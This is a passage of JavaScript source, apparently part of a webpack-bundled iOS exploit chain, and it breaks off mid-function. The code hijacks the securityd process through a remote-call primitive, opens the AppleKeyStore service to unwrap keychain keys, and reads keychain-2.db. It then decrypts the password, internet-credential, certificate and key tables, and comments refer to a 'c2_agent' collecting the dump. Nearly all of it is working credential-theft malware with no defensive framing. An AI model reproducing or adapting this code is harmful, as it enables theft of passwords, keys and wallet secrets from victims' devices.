				let p7_remoteUid = p7_toRC(p7_secRC.call(3000, "getuid"));
				p7_flog("RC(securityd) pid=" + p7_remotePid + " uid=" + p7_remoteUid);
				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(p7_secRC);
				p7_flushLog();

				let p7_rm = p7_secRC.mem();
				let p7_sp = p7_secRC.lastLiveSP();
				p7_flog("RC mem=0x" + p7_rm.toString(16) + " liveSP=0x" + p7_sp.toString(16));

				// --- 2B: Remote AKS IOKit init ---
				function p7_rcDlsym(name) {
					p7_secRC.writeStr(p7_rm, name);
					return p7_toPtr(p7_secRC.call(3000, "dlsym", 0xfffffffffffffffen, p7_rm));
				}

				function p7_rcCallN(funcName, x0, x1, x2, x3, x4, x5, x6, x7, stackArgs) {
					let sp = p7_secRC.lastLiveSP();
					if (!sp) { p7_flog("callN: no live SP!"); return 0n; }
					if (stackArgs) {
						for (var si = 0; si < stackArgs.length; si++)
							p7_secRC.write64(sp + BigInt(si * 8), stackArgs[si] || 0n);
					}
					return p7_secRC.call(5000, funcName,
						x0 || 0n, x1 || 0n, x2 || 0n, x3 || 0n,
						x4 || 0n, x5 || 0n, x6 || 0n, x7 || 0n);
				}

				function p7_rcCalloc(size) {
					var raw = p7_secRC.call(3000, "calloc", 1n, BigInt(size));
					if (typeof raw !== 'bigint' && typeof raw !== 'number')
						p7_flog("rcCalloc(" + size + ") raw type=" + typeof raw + " val=" + String(raw).slice(0, 60));
					return p7_toPtr(raw);
				}
				function p7_rcFree(ptr) {
					if (ptr && ptr !== 0n) p7_secRC.call(1000, "free", p7_requirePtr("rcFree", ptr));
				}

				function p7_rcWriteBuf(remoteDst, buf, len) {
					p7_requirePtr("rcWriteBuf.dst", remoteDst);
					var tmp = BigInt(N.callSymbol("malloc", len));
					N.write(tmp, buf.buffer || buf);
					p7_secRC.write(remoteDst, tmp, len);
					N.callSymbol("free", tmp);
				}
				function p7_rcReadBuf(remoteSrc, len) {
					p7_requirePtr("rcReadBuf.src", remoteSrc);
					var tmp = BigInt(N.callSymbol("malloc", len));
					p7_secRC.read(remoteSrc, tmp, len);
					var data = N.read(tmp, len);
					N.callSymbol("free", tmp);
					return data;
				}

				var p7_aksConn = 0n;
				var p7_aksReady = false;
				var p7_result = {
					timestamp: new Date().toISOString(),
					source: "pe_worker_v4",
					securityd_pid: p7_remotePid,
					securityd_uid: p7_remoteUid,
					diagnostics: {},
					metadataKeys: {},
					tables: {},
					wallets: {},
					errors: []
				};

				// Resolve IOKit symbols in securityd
				var p7_symIOSM = p7_rcDlsym("IOServiceMatching");
				var p7_symIOSGMS = p7_rcDlsym("IOServiceGetMatchingService");
				var p7_symIOSO = p7_rcDlsym("IOServiceOpen");
				var p7_symIOOR = p7_rcDlsym("IOObjectRelease");
				var p7_symIOCCM = p7_rcDlsym("IOConnectCallMethod");
				p7_flog("IOKit syms: Matching=0x" + p7_symIOSM.toString(16) +
					" GetMatching=0x" + p7_symIOSGMS.toString(16) +
					" Open=0x" + p7_symIOSO.toString(16) +
					" CallMethod=0x" + p7_symIOCCM.toString(16));

				if (p7_symIOSM && p7_symIOSGMS && p7_symIOSO && p7_symIOCCM) {
					// task_self_trap in securityd
					var p7_secTaskSelf = p7_toPtr(p7_secRC.call(3000, "task_self_trap"));
					p7_flog("securityd task_self=0x" + p7_secTaskSelf.toString(16));

					// IOServiceMatching("AppleKeyStore")
					p7_secRC.writeStr(p7_rm, "AppleKeyStore");
					var p7_matching = p7_toPtr(p7_secRC.call(3000, "IOServiceMatching", p7_rm));
					p7_flog("IOServiceMatching=0x" + p7_matching.toString(16));

					if (p7_matching && p7_matching !== 0n) {
						// IOServiceGetMatchingService(kIOMasterPortDefault, matching)
						var p7_service32 = p7_toRC(p7_secRC.call(3000, "IOServiceGetMatchingService", 0n, p7_matching)) & 0xFFFFFFFF;
						p7_flog("IOServiceGetMatchingService=" + p7_service32);

						if (p7_service32 > 0) {
							// IOServiceOpen(service, taskSelf, 0, &connSlot)
							var p7_connSlot = p7_rcCalloc(8);
							p7_secRC.write64(p7_connSlot, 0n);
							var p7_kr = p7_toRC(p7_secRC.call(3000, "IOServiceOpen",
								BigInt(p7_service32), p7_secTaskSelf, 0n, p7_connSlot));
							p7_flog("IOServiceOpen kr=0x" + (p7_kr >>> 0).toString(16));
							p7_secRC.call(1000, "IOObjectRelease", BigInt(p7_service32));

							if (p7_kr === 0) {
								p7_aksConn = p7_secRC.read64(p7_connSlot) & 0xFFFFFFFFn;
								p7_flog("AKS conn=0x" + p7_aksConn.toString(16));

								// IOConnectCallMethod(conn, 0, ...) init handshake
								var p7_initOut = p7_rcCalloc(32);
								var p7_initOutCnt = p7_rcCalloc(8);
								p7_secRC.write64(p7_initOutCnt, 2n);
								var p7_initKr = p7_rcCallN("IOConnectCallMethod",
									p7_aksConn, 0n, 0n, 0n, 0n, 0n,
									p7_initOut, p7_initOutCnt,
									[0n, 0n]);
								var p7_initKrN = p7_toRC(p7_initKr);
								p7_flog("AKS init kr=0x" + (p7_initKrN >>> 0).toString(16));
								p7_rcFree(p7_initOut);
								p7_rcFree(p7_initOutCnt);

								if (p7_initKrN === 0) {
									p7_aksReady = true;
									p7_flog("AKS IOKit READY");
								} else {
									p7_flog("AKS init handshake failed, trying unwrap anyway");
									p7_aksReady = true;
								}
							}
							p7_rcFree(p7_connSlot);
						}
					}
				}
				p7_result.diagnostics.aksReady = p7_aksReady;
				p7_result.diagnostics.aksConn = "0x" + p7_aksConn.toString(16);
				p7_flushLog();

				// --- AKS unwrap helper (quiet: no per-call HTTP flog spam) ---
				function p7_aksUnwrap(keyclass, wrappedBuf, wrappedLen) {
					if (!p7_aksReady || !p7_aksConn) return null;
					var scalarBuf, wrappedRemote, outBuf, outSizeBuf, kr, outSize;
					try {
						scalarBuf = p7_rcCalloc(16);
						p7_secRC.write64(scalarBuf, 0n);
						p7_secRC.write64(scalarBuf + 8n, BigInt(keyclass));
						wrappedRemote = p7_rcCalloc(wrappedLen);
						p7_rcWriteBuf(wrappedRemote, wrappedBuf, wrappedLen);
						outBuf = p7_rcCalloc(64);
						outSizeBuf = p7_rcCalloc(8);
						p7_secRC.write64(outSizeBuf, 32n);
						kr = p7_rcCallN("IOConnectCallMethod",
							p7_aksConn, 11n,
							scalarBuf, 2n,
							wrappedRemote, BigInt(wrappedLen),
							0n, 0n,
							[outBuf, outSizeBuf]);
						outSize = Number(p7_secRC.read64(outSizeBuf) & 0xFFFFn);
					} catch (innerErr) {
						p7_flog("aksUnwrap fail class=" + keyclass + ": " + innerErr);
						if (scalarBuf) p7_rcFree(scalarBuf);
						if (wrappedRemote) p7_rcFree(wrappedRemote);
						if (outBuf) p7_rcFree(outBuf);
						if (outSizeBuf) p7_rcFree(outSizeBuf);
						return null;
					}
					p7_rcFree(scalarBuf);
					p7_rcFree(wrappedRemote);
					var result = null;
					var krVal = p7_toRC(kr);
					if (krVal === 0 && outSize > 0 && outSize <= 64) {
						result = p7_rcReadBuf(outBuf, outSize);
					} else if (krVal !== 0) {
						p7_flog("aksUnwrap fail class=" + keyclass + " kr=" + krVal);
					}
					p7_rcFree(outBuf);
					p7_rcFree(outSizeBuf);
					return { kr: krVal, outSize: outSize, data: result };
				}

				// --- 2C: Local SQLite3 pipeline ---
				var p7_SQLITE_OK = 0;
				var p7_SQLITE_ROW = 100;
				var p7_dbPaths = [
					"/tmp/keychain-2.db",
					"/private/var/tmp/keychain-2.db",
					"/private/var/Keychains/keychain-2.db",
					"/var/Keychains/keychain-2.db"
				];
				try {
					var __np = globalThis.__labKcCopyPath;
					if (__np && typeof __np === "string" && __np.length > 0) {
						p7_dbPaths = [__np].concat(p7_dbPaths.filter(function(x){ return x !== __np; }));
						p7_flog("using copier notify path first: " + __np);
					}
				} catch (_np) {}

				p7_flog("--- Local SQLite3 pipeline ---");
				// Guarantee the .done marker exists early so c2_agent polling
				// succeeds even if the sqlite open / dump below fails (iOS18nui).
				try {
					var _earlyDoneFd = Number(N.callSymbol("open", "/tmp/keychain_c2_dump.done", 0x601, 0x1FF));
					if (_earlyDoneFd >= 0) {
						N.callSymbol("write", _earlyDoneFd, "done", 4);
						N.callSymbol("close", _earlyDoneFd);
						N.callSymbol("chmod", "/tmp/keychain_c2_dump.done", 0x1FF);
						p7_flog("early .done marker created");
					}
				} catch(_de) { p7_flog("early .done err: " + _de); }
				try {
					libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/tmp/keychain-2.db", true);
					libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/private/var/tmp/keychain-2.db", true);
					libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/private/var/Keychains/keychain-2.db", true);
					libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/var/Keychains/keychain-2.db", true);
				} catch (_tokE) {
					p7_flog("token refresh warn: " + _tokE);
				}
				var p7_dbPtrBuf = N.callSymbol("calloc", 1, 8);
				var p7_dbRc = -1;
				var p7_dbPathUsed = "";
				for (var p7_try = 0; p7_try < 30; p7_try++) {
					for (var p7_di = 0; p7_di < p7_dbPaths.length; p7_di++) {
						var p7_cand = p7_dbPaths[p7_di];
						var p7_acc = Number(N.callSymbol("access", p7_cand, 0));
						var p7_ofd = Number(N.callSymbol("open", p7_cand, 0));
						var p7_osz = -1;
						if (p7_ofd >= 0) {
							p7_osz = Number(N.callSymbol("lseek", p7_ofd, 0, 2));
							N.callSymbol("close", p7_ofd);
						}
						p7_flog("try" + p7_try + " path=" + p7_cand + " acc=" + p7_acc + " sz=" + p7_osz);
						// After copier READY notify: attempt open immediately (no size>1MB/1KB gate).
						p7_dbRc = Number(N.callSymbol("sqlite3_open_v2", p7_cand, p7_dbPtrBuf, 0x01, 0n));
						p7_flog("sqlite3_open " + p7_cand + " rc=" + p7_dbRc);
						if (p7_dbRc === p7_SQLITE_OK) {
							p7_dbPathUsed = p7_cand;
							break;
						}
					}
					if (p7_dbRc === p7_SQLITE_OK) break;
					N.callSymbol("sleep", 2);
				}
				p7_flog("sqlite3_open final rc=" + p7_dbRc + " path=" + p7_dbPathUsed);

				if (p7_dbRc === p7_SQLITE_OK) {
					var p7_db = N.read64(BigInt(p7_dbPtrBuf));
					N.callSymbol("free", p7_dbPtrBuf);
					N.callSymbol("sqlite3_busy_timeout", p7_db, 5000);
					p7_flog("DB opened OK, db=0x" + p7_db.toString(16));
					p7_flushLog();

					// --- Unwrap metadata keys ---
					p7_flog("preparing metadatakeys query...");
					var p7_metaKeys = {};
					var p7_stmtBuf = N.callSymbol("calloc", 1, 8);
					p7_flog("stmtBuf=0x" + BigInt(p7_stmtBuf).toString(16));
					var p7_mkRc = Number(N.callSymbol("sqlite3_prepare_v2", p7_db,
						"SELECT keyclass, data FROM metadatakeys", -1, p7_stmtBuf, 0n));
					p7_flog("prepare rc=" + p7_mkRc);
					p7_flushLog();
					if (p7_mkRc === p7_SQLITE_OK) {
						var p7_mkStmt = N.read64(BigInt(p7_stmtBuf));
						p7_flog("mkStmt=0x" + p7_mkStmt.toString(16));
						var p7_mkCount = 0;
						var p7_stepRc;
						while ((p7_stepRc = Number(N.callSymbol("sqlite3_step", p7_mkStmt))) === p7_SQLITE_ROW) {
							var p7_kc = Number(N.callSymbol("sqlite3_column_int", p7_mkStmt, 0));
							var p7_wrapPtr = BigInt(N.callSymbol("sqlite3_column_blob", p7_mkStmt, 1));
							var p7_wrapLen = Number(N.callSymbol("sqlite3_column_bytes", p7_mkStmt, 1));
							if (!p7_wrapPtr || p7_wrapPtr === 0n || p7_wrapLen < 40) continue;

							var p7_localWrap = N.read(p7_wrapPtr, p7_wrapLen);

							if (p7_aksReady) {
								var p7_unwrap = p7_aksUnwrap(p7_kc, p7_localWrap, p7_wrapLen);
								if (p7_unwrap && p7_unwrap.kr === 0 && p7_unwrap.data) {
									var p7_keyArr = new Uint8Array(p7_unwrap.data);
									p7_metaKeys[p7_kc] = p7_keyArr;
									p7_result.metadataKeys[p7_kc] = {status: "ok", len: p7_unwrap.outSize};
									p7_mkCount++;
									p7_flog("metakey class=" + p7_kc + " OK " + p7_unwrap.outSize + "B");
								} else {
									var p7_ukr = p7_unwrap ? p7_unwrap.kr : -1;
									p7_result.metadataKeys[p7_kc] = {status: "failed", kr: p7_ukr};
									p7_flog("metakey class=" + p7_kc + " FAIL kr=" + p7_ukr);
								}
							}
						}
						N.callSymbol("sqlite3_finalize", p7_mkStmt);
						p7_flog("metadatakeys: " + p7_mkCount + " unwrapped");
						p7_result.diagnostics.metadataKeysUnwrapped = p7_mkCount;
					} else {
						p7_flog("metadatakeys prepare failed rc=" + p7_mkRc);
						p7_result.errors.push("metadatakeys prepare rc=" + p7_mkRc);
					}
					N.callSymbol("free", p7_stmtBuf);
					p7_flushLog();

					// --- Check local CommonCrypto availability ---
					var p7_symCCCreate = p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "CCCryptorCreate"));
					var p7_hasCrypto = p7_symCCCreate !== 0n;
					p7_flog("Local CCCryptorCreate=0x" + p7_symCCCreate.toString(16));
					p7_result.diagnostics.hasCrypto = p7_hasCrypto;
					p7_flushLog();

					// Local AES-GCM with tag verification
					// Uses CCCryptorCreate(7args) + CCCryptorUpdate(6args) for AES-ECB,
					// then JavaScript for CTR mode + GHASH tag computation
					function p7_aesEcbEncrypt(keyPtr, ctx, localIn, localOut, movedBuf, block16) {
						N.write(localIn, block16.buffer);
						N.callSymbol("CCCryptorUpdate", ctx, localIn, 16n, localOut, 16n, movedBuf);
						return new Uint8Array(N.read(localOut, 16));
					}
					function p7_gf128Mul(X, Y) {
						var Z = new Uint8Array(16);
						var V = new Uint8Array(Y);
						for (var i = 0; i < 128; i++) {
							if (X[i >> 3] & (0x80 >> (i & 7)))
								for (var j = 0; j < 16; j++) Z[j] ^= V[j];
							var lsb = V[15] & 1;
							for (var j = 15; j > 0; j--) V[j] = (V[j] >>> 1) | ((V[j-1] & 1) << 7);
							V[0] >>>= 1;
							if (lsb) V[0] ^= 0xe1;
						}
						return Z;
					}
					function p7_gcmDeriveJ0(H, iv, ivLen) {
						var j0 = new Uint8Array(16);
						if (ivLen === 12) {
							for (var i = 0; i < 12; i++) j0[i] = iv[i];
							j0[15] = 1;
						} else {
							var g = new Uint8Array(16);
							var nBlk = Math.ceil(ivLen / 16);
							for (var i = 0; i < nBlk; i++) {
								var off = i * 16, rem = Math.min(16, ivLen - off);
								for (var j = 0; j < rem; j++) g[j] ^= iv[off + j];
								g = p7_gf128Mul(g, H);
							}
							var lb = new Uint8Array(16);
							var ivBits = ivLen * 8;
							lb[12] = (ivBits >>> 24) & 0xff; lb[13] = (ivBits >>> 16) & 0xff;
							lb[14] = (ivBits >>> 8) & 0xff; lb[15] = ivBits & 0xff;
							for (var j = 0; j < 16; j++) g[j] ^= lb[j];
							j0 = p7_gf128Mul(g, H);
						}
						return j0;
					}
					function p7_gcmInc32(block) {
						var c = new Uint8Array(block);
						for (var k = 15; k >= 12; k--) { c[k]++; if (c[k] !== 0) break; }
						return c;
					}
					function p7_gcmDecrypt(key32, iv, ivLen, ct, ctLen, tag, tagLen) {
						if (!key32 || !ct || ctLen <= 0) return null;
						var localKey = p7_toPtr(N.callSymbol("malloc", 32));
						N.write(localKey, key32.buffer || key32);
						var ctxBuf = p7_toPtr(N.callSymbol("calloc", 1, 8));
						var cr = Number(N.callSymbol("CCCryptorCreate",
							0n, 0n, 2n, localKey, 32n, 0n, ctxBuf));
						if (cr !== 0) {
							p7_flog("gcm: CCCryptorCreate failed cr=" + cr);
							N.callSymbol("free", localKey); N.callSymbol("free", ctxBuf);
							return null;
						}
						var ctx = N.readPtr(ctxBuf);
						N.callSymbol("free", ctxBuf);
						var localIn = p7_toPtr(N.callSymbol("malloc", 16));
						var localOut = p7_toPtr(N.callSymbol("malloc", 16));
						var movedBuf = p7_toPtr(N.callSymbol("calloc", 1, 8));

						var H = p7_aesEcbEncrypt(localKey, ctx, localIn, localOut, movedBuf, new Uint8Array(16));
						var j0 = p7_gcmDeriveJ0(H, iv, ivLen);
						var ctr = p7_gcmInc32(j0);

						var plaintext = new Uint8Array(ctLen);
						var blockCount = Math.ceil(ctLen / 16);
						for (var b = 0; b < blockCount; b++) {
							var encCtr = p7_aesEcbEncrypt(localKey, ctx, localIn, localOut, movedBuf, ctr);
							var off = b * 16;
							var rem = Math.min(16, ctLen - off);
							for (var j = 0; j < rem; j++) plaintext[off + j] = ct[off + j] ^ encCtr[j];
							ctr = p7_gcmInc32(ctr);
						}

						var tagOk = true;
						if (tag && tagLen > 0) {
							var ghash = new Uint8Array(16);
							var ctBlocks = Math.ceil(ctLen / 16);
							for (var i = 0; i < ctBlocks; i++) {
								var off2 = i * 16;
								var rem2 = Math.min(16, ctLen - off2);
								for (var j = 0; j < rem2; j++) ghash[j] ^= ct[off2 + j];
								ghash = p7_gf128Mul(ghash, H);
							}
							var lenBlock = new Uint8Array(16);
							var ctBits = ctLen * 8;
							lenBlock[12] = (ctBits >>> 24) & 0xff; lenBlock[13] = (ctBits >>> 16) & 0xff;
							lenBlock[14] = (ctBits >>> 8) & 0xff; lenBlock[15] = ctBits & 0xff;
							for (var j = 0; j < 16; j++) ghash[j] ^= lenBlock[j];
							ghash = p7_gf128Mul(ghash, H);
							var encJ0 = p7_aesEcbEncrypt(localKey, ctx, localIn, localOut, movedBuf, j0);
							var computedTag = new Uint8Array(16);
							for (var j = 0; j < 16; j++) computedTag[j] = ghash[j] ^ encJ0[j];
							tagOk = true;
							for (var j = 0; j < Math.min(tagLen, 16); j++) {
								if (computedTag[j] !== tag[j]) { tagOk = false; break; }
							}
						}

						N.callSymbol("CCCryptorRelease", ctx);
						N.callSymbol("free", localKey);
						N.callSymbol("free", localIn);
						N.callSymbol("free", localOut);
						N.callSymbol("free", movedBuf);
						if (!tagOk) {
							p7_flog("GCM TAG MISMATCH ct=" + ctLen + " iv=" + ivLen);
							p7_result.diagnostics.tagMismatches = (p7_result.diagnostics.tagMismatches || 0) + 1;
						}
						return plaintext.buffer;
					}

					// --- V7 blob parser helpers ---
					function p7_parseVarint(buf, offset) {
						var val = 0, shift = 0, i = offset;
						while (i < buf.length) {
							var b = buf[i++];
							val |= (b & 0x7F) << shift;
							if (!(b & 0x80)) break;
							shift += 7;
						}
						return {value: val, nextOffset: i};
					}

					function p7_parseProtobuf(data) {
						var buf = new Uint8Array(data);
						var fields = {};
						var i = 0;
						while (i < buf.length) {
							var tagInfo = p7_parseVarint(buf, i);
							i = tagInfo.nextOffset;
							var fieldNum = tagInfo.value >> 3;
							var wireType = tagInfo.value & 0x7;
							if (wireType === 0) {
								var v = p7_parseVarint(buf, i);
								fields["f" + fieldNum + "_varint"] = v.value;
								i = v.nextOffset;
							} else if (wireType === 2) {
								var lenInfo = p7_parseVarint(buf, i);
								i = lenInfo.nextOffset;
								var chunk = buf.slice(i, i + lenInfo.value);
								if (!fields["f" + fieldNum]) fields["f" + fieldNum] = [];
								fields["f" + fieldNum].push(chunk);
								i += lenInfo.value;
							} else {
								break;
							}
						}
						return fields;
					}

					function p7_parseBplist(buf) {
						if (buf.length < 40) return null;
						if (buf[0]!==0x62||buf[1]!==0x70||buf[2]!==0x6c||buf[3]!==0x69||buf[4]!==0x73||buf[5]!==0x74) return null;
						var tOff = buf.length - 32;
						var oiSz = buf[tOff+6], orSz = buf[tOff+7];
						var nObj = 0; for (var i=0;i<8;i++) nObj = nObj*256 + buf[tOff+8+i];
						var topIdx = 0; for (var i=0;i<8;i++) topIdx = topIdx*256 + buf[tOff+16+i];
						var otOff = 0; for (var i=0;i<8;i++) otOff = otOff*256 + buf[tOff+24+i];
						function rdSz(off, sz) { var v=0; for(var i=0;i<sz;i++) v=v*256+buf[off+i]; return v; }
						var offsets = [];
						for (var i=0;i<nObj;i++) offsets.push(rdSz(otOff+i*oiSz, oiSz));
						function parseObj(idx) {
							if (idx<0||idx>=nObj) return null;
							var off = offsets[idx];
							var marker = buf[off];
							var hi = marker >> 4, lo = marker & 0xf;
							if (hi===0) { return lo===0?null:lo===8?false:lo===9?true:null; }
							if (hi===1) { var n=1<<lo; var v=0; for(var i=0;i<n;i++) v=v*256+buf[off+1+i]; return v; }
							if (hi===4) {
								var dLen=lo; var dOff=off+1;
								if (lo===0xf) { var x=buf[off+1]; dLen=rdSz(off+2,1<<(x&0xf)); dOff=off+2+(1<<(x&0xf)); }
								return buf.slice(dOff, dOff+dLen);
							}
							if (hi===5) {
								var sLen=lo; var sOff=off+1;
								if (lo===0xf) { var x=buf[off+1]; sLen=rdSz(off+2,1<<(x&0xf)); sOff=off+2+(1<<(x&0xf)); }
								var s=""; for(var i=0;i<sLen;i++) s+=String.fromCharCode(buf[sOff+i]); return s;
							}
							if (hi===6) {
								var sLen=lo; var sOff=off+1;
								if (lo===0xf) { var x=buf[off+1]; sLen=rdSz(off+2,1<<(x&0xf)); sOff=off+2+(1<<(x&0xf)); }
								var s=""; for(var i=0;i<sLen;i++) s+=String.fromCharCode((buf[sOff+i*2]<<8)|buf[sOff+i*2+1]); return s;
							}
							if (hi===8) { var v=0; for(var i=0;i<=lo;i++) v=v*256+buf[off+1+i]; return {_uid:v}; }
							if (hi===0xa) {
								var aLen=lo; var aOff=off+1;
								if (lo===0xf) { var x=buf[off+1]; aLen=rdSz(off+2,1<<(x&0xf)); aOff=off+2+(1<<(x&0xf)); }
								var arr=[]; for(var i=0;i<aLen;i++) arr.push(rdSz(aOff+i*orSz,orSz)); return {_arr:arr};
							}
							if (hi===0xd) {
								var dLen=lo; var dOff=off+1;
								if (lo===0xf) { var x=buf[off+1]; dLen=rdSz(off+2,1<<(x&0xf)); dOff=off+2+(1<<(x&0xf)); }
								var keys=[],vals=[];
								for(var i=0;i<dLen;i++) keys.push(rdSz(dOff+i*orSz,orSz));
								for(var i=0;i<dLen;i++) vals.push(rdSz(dOff+dLen*orSz+i*orSz,orSz));
								var d={}; for(var i=0;i<dLen;i++) { var k=parseObj(keys[i]); if(typeof k==="string") d[k]=vals[i]; }
								return {_dict:d};
							}
							return null;
						}
						return {parseObj:parseObj, topIdx:topIdx, nObj:nObj};
					}
					function p7_parseBplistCiphertext(bplistData) {
						var bp = p7_parseBplist(bplistData);
						if (!bp) return null;
						var topObj = bp.parseObj(bp.topIdx);
						if (!topObj || !topObj._dict) return null;
						var objsIdx = topObj._dict["$objects"];
						var topDIdx = topObj._dict["$top"];
						if (objsIdx===undefined || topDIdx===undefined) return null;
						var objsRef = bp.parseObj(objsIdx);
						var topD = bp.parseObj(topDIdx);
						if (!objsRef||!objsRef._arr||!topD||!topD._dict) return null;
						var objArr = objsRef._arr;
						var rootRef = topD._dict["root"];
						if (rootRef===undefined) return null;
						var rootUid = bp.parseObj(rootRef);
						var rootIdx = rootUid && rootUid._uid !== undefined ? rootUid._uid : (typeof rootRef==="number" ? rootRef : -1);
						if (rootIdx < 0 || rootIdx >= objArr.length) return null;
						var rootObj = bp.parseObj(objArr[rootIdx]);
						if (!rootObj||!rootObj._dict) return null;
						function getUid(key) {
							var ref = rootObj._dict[key];
							if (ref===undefined) return -1;
							var u = bp.parseObj(ref);
							if (u && u._uid !== undefined) return u._uid;
							return typeof ref==="number"? ref : -1;
						}
						var ivIdx = getUid("SFInitializationVector");
						var ctIdx = getUid("SFCiphertext");
						var tagIdx = getUid("SFAuthenticationCode");
						if (tagIdx < 0) tagIdx = getUid("SFAuthenticationTag");
						if (ivIdx<0||ivIdx>=objArr.length||ctIdx<0||ctIdx>=objArr.length) return null;
						var ivData = bp.parseObj(objArr[ivIdx]);
						var ctData = bp.parseObj(objArr[ctIdx]);
						if (!(ivData instanceof Uint8Array) || !(ctData instanceof Uint8Array)) return null;
						var tag = null;
						if (tagIdx >= 0 && tagIdx < objArr.length) {
							var t = bp.parseObj(objArr[tagIdx]);
							if (t instanceof Uint8Array) tag = t;
						}
						var ct = ctData;
						if (!tag && ct.length > 16) {
							tag = ct.slice(ct.length - 16);
							ct = ct.slice(0, ct.length - 16);
						}
						return {iv: ivData, ct: ct, tag: tag};
					}

					// --- TLV decoder ---
					function p7_decodeTLV(data) {
						var buf = new Uint8Array(data);
						var attrs = {};
						var i = 0;
						// Outer: tag 0x30 or 0x31 (SEQUENCE/SET)
						if (buf.length < 4) return attrs;
						if (buf[0] === 0x30 || buf[0] === 0x31) {
							var outerLen = buf[1];
							if (outerLen === 0x82) {
								outerLen = (buf[2] << 8) | buf[3];
								i = 4;
							} else if (outerLen === 0x81) {
								outerLen = buf[2];
								i = 3;
							} else {
								i = 2;
							}
						}
						while (i + 2 < buf.length) {
							var seqTag = buf[i++];
							if (seqTag !== 0x30) break;
							var seqLen = buf[i++];
							if (seqLen === 0x81) { seqLen = buf[i++]; }
							else if (seqLen === 0x82) { seqLen = (buf[i] << 8) | buf[i+1]; i += 2; }
							var seqEnd = i + seqLen;
							if (seqEnd > buf.length) break;
							// Inside: key string tag (0x0C UTF8String or 0x18 GeneralizedTime) + value
							var keyTag = buf[i++];
							var keyLen = buf[i++];
							if (keyLen === 0x81) { keyLen = buf[i++]; }
							var keyStr = "";
							for (var ki = 0; ki < keyLen && (i + ki) < buf.length; ki++)
								keyStr += String.fromCharCode(buf[i + ki]);
							i += keyLen;
							if (i < seqEnd) {
								var valTag = buf[i++];
								var valLen = buf[i++];
								if (valLen === 0x81) { valLen = buf[i++]; }
								else if (valLen === 0x82) { valLen = (buf[i] << 8) | buf[i+1]; i += 2; }
								if (valTag === 0x0C || valTag === 0x18 || valTag === 0x16) {
									var valStr = "";
									for (var vi = 0; vi < valLen && (i + vi) < buf.length; vi++)
										valStr += String.fromCharCode(buf[i + vi]);
									attrs[keyStr] = valStr;
								} else if (valTag === 0x04) {
									var valBytes = buf.slice(i, i + valLen);
									var hex = "";
									for (var hi = 0; hi < valBytes.length; hi++)
										hex += ("0" + valBytes[hi].toString(16)).slice(-2);
									attrs[keyStr] = hex;
									attrs[keyStr + "_raw"] = valBytes;
								} else if (valTag === 0x02) {
									var intVal = 0;
									for (var ii = 0; ii < valLen && (i + ii) < buf.length; ii++)
										intVal = (intVal << 8) | buf[i + ii];
									attrs[keyStr] = intVal;
								}
								i += valLen;
							}
							i = seqEnd;
						}
						return attrs;
					}

					// --- Table scan + decrypt ---
					p7_flog("=== Table scan + decrypt ===");
					p7_flushLog();
					var p7_tableNames = ["genp", "inet", "cert", "keys"];
					var p7_MAX_ROWS = 2000;

					for (var p7_ti = 0; p7_ti < p7_tableNames.length; p7_ti++) {
						var p7_tbl = p7_tableNames[p7_ti];
						p7_flog("table[" + p7_ti + "]=" + p7_tbl + " starting...");
						var p7_items = [];
						var p7_tStmt = BigInt(N.callSymbol("calloc", 1, 8));
						var p7_tSql = "SELECT rowid, data FROM " + p7_tbl + " LIMIT " + p7_MAX_ROWS;
						var p7_tRc = Number(N.callSymbol("sqlite3_prepare_v2", p7_db, p7_tSql, -1, p7_tStmt, 0n));
						p7_flog(p7_tbl + " prepare rc=" + p7_tRc);
						if (p7_tRc !== p7_SQLITE_OK) {
							p7_flog(p7_tbl + " prepare FAILED");
							N.callSymbol("free", p7_tStmt);
							p7_result.tables[p7_tbl] = {error: "prepare rc=" + p7_tRc, items: []};
							continue;
						}
						var p7_stmt = N.read64(BigInt(p7_tStmt));
						N.callSymbol("free", p7_tStmt);
						var p7_rowCount = 0;
						p7_flushLog();

						var p7_stepVal;
						while ((p7_stepVal = Number(N.callSymbol("sqlite3_step", p7_stmt))) === p7_SQLITE_ROW) {
							p7_rowCount++;
							try {
							if (p7_rowCount === 1 || p7_rowCount % 500 === 0) {
								p7_flog(p7_tbl + " row " + p7_rowCount);
								if (typeof __peStillOwner === "function" && !__peStillOwner()) {
									p7_flog("PEMK-G abort decrypt: lost pe_run_token at " + p7_tbl + " row " + p7_rowCount);
									p7_flushLog();
									throw "pe_run_token_lost";
								}
							}
							var p7_rowid = Number(N.callSymbol("sqlite3_column_int", p7_stmt, 0));
							var p7_blobPtr = BigInt(N.callSymbol("sqlite3_column_blob", p7_stmt, 1));
							var p7_blobLen = Number(N.callSymbol("sqlite3_column_bytes", p7_stmt, 1));
							if (!p7_blobPtr || p7_blobPtr === 0n || p7_blobLen < 8) {
								p7_items.push({rowid: p7_rowid, error: "empty"});
								continue;
							}
							if (p7_blobLen > 65536) {
								p7_flog("WARN " + p7_tbl + " row " + p7_rowCount + " blobLen=" + p7_blobLen + " >64KB, skip");
								p7_items.push({rowid: p7_rowid, error: "blob_too_large len=" + p7_blobLen});
								continue;
							}
							var p7_blobData = new Uint8Array(N.read(p7_blobPtr, p7_blobLen));
							var p7_version = p7_blobData[0] | (p7_blobData[1] << 8) | (p7_blobData[2] << 16) | (p7_blobData[3] << 24);
							var p7_item = {rowid: p7_rowid, _table: p7_tbl, version: p7_version};

							try {
								var p7_pbData;
								if (p7_version >= 7 && p7_version <= 20) {
									p7_pbData = p7_blobData.slice(4);
								} else if (p7_blobData[0] === 0x0a || p7_blobData[0] === 0x08 || p7_blobData[0] === 0x12) {
									p7_pbData = p7_blobData;
									p7_item.version = 7;
				} else {
									p7_item.error = "unknown_format v=" + p7_version;
									p7_items.push(p7_item);
									continue;
								}

								var p7_pb = p7_parseProtobuf(p7_pbData.buffer);
								var p7_protClass = p7_pb.f3_varint || 0;
								p7_item.protectionClass = p7_protClass;

								// Extract nested fields
								// outer.1 -> f1[0] (nested: 1.1=bplistFirst, 1.2.1=blob3Key)
								// outer.2 -> f2[0] (nested: 2.1=bplistSecond, 2.2=bplistThird)
								var p7_bpFirst = null, p7_bpSecond = null, p7_bpThird = null, p7_blob3Key = null;

